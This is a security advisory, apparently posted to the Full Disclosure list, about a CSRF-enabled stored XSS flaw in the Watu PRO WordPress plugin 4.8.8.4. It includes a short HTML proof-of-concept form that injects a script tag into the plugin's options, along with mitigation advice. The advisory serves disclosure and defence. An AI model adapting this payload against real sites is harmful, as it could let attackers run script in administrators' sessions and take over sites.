Subject: [FD] Stored XSS in Watu PRO allows unauthenticated attackers to do
	almost anything an admin can (WordPress plugin)

Details
================
Software: Watu PRO
Version: 4.8.8.4
Homepage: http://calendarscripts.info/watupro/
Advisory report: https://security.dxw.com/advisories/stored-xss-in-watu-pro-allows-unauthenticated-attackers-to-do-almost-anything-an-admin-can/
CVE: Awaiting assignment
CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:P/I:P/A:N)

Description
================
Stored XSS in Watu PRO allows unauthenticated attackers to do almost anything an admin can

Vulnerability
================
An attacker able to convince an admin to visit a link of their choosing (e.g. through phishing) is able to execute arbitrary JavaScript. This makes use of a CSRF vulnerability (no nonce protection on the options form)

Proof of concept
================
If a logged-in administrator user clicks the submit button on this form, a JavaScript alert will display on /wp-admin/admin.php?page=watupro_options (in a real attack the form can be made to auto-submit using JavaScript):
<form action=\"http://localhost/wp-admin/admin.php?page=watupro_options\" method=\"POST\">
<input type=\"text\" name=\"upload_file_types\" value=\"&quot;>&lt;script>alert(1)&lt;/script>\">
<input type=\"text\" name=\"save_ajax_settings\" value=\"Save Ajax Related Settings\">
<input type=\"submit\">
</form>

Mitigations
================
This issue has been discussed with the author, who disagrees that there is an exploitable issue. We maintain that the above proof of concept demonstrates this issue. Nonetheless, the author has told us that they have made changes to address the problem in version 4.9.0.8 of this plugin. We have not verified these changes, so our recommendation is to upgrade to version 4.9.0.8 or later, and ideally conduct your own security assessment of this plugin.
